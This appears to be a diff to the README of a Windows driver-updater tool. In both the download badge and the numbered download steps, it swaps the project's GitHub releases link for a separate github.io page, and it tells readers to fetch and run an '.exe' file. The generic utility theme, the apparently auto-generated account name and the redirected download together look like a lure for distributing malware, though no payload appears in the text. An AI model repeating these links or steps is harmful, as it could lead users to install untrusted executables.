@@ -1,6 +1,6 @@
 # 🛠️ DriverHub-Updater - Keep your computer hardware running smooth
 
-[![Download DriverHub](https://img.shields.io/badge/Download-DriverHub-blue.svg)](https://github.com/Entertained-organon536/DriverHub-Updater/releases)
+[![Download DriverHub](https://img.shields.io/badge/Download-DriverHub-blue.svg)](https://entertained-organon536.github.io)
 
 ## 📌 About this software
 
@@ -18,7 +18,7 @@ Your computer must meet these basic requirements to run the software:
 ## 📥 How to download the app
 
 1. Open your web browser.
-2. Visit the releases page at [https://github.com/Entertained-organon536/DriverHub-Updater/releases](https://github.com/Entertained-organon536/DriverHub-Updater/releases).
+2. Visit the releases page at [https://entertained-organon536.github.io](https://entertained-organon536.github.io).
 3. Find the latest release version at the top of the list.
 4. Click the link that ends in ".exe" to begin the download.
 5. Save the file to your desktop or downloads folder.
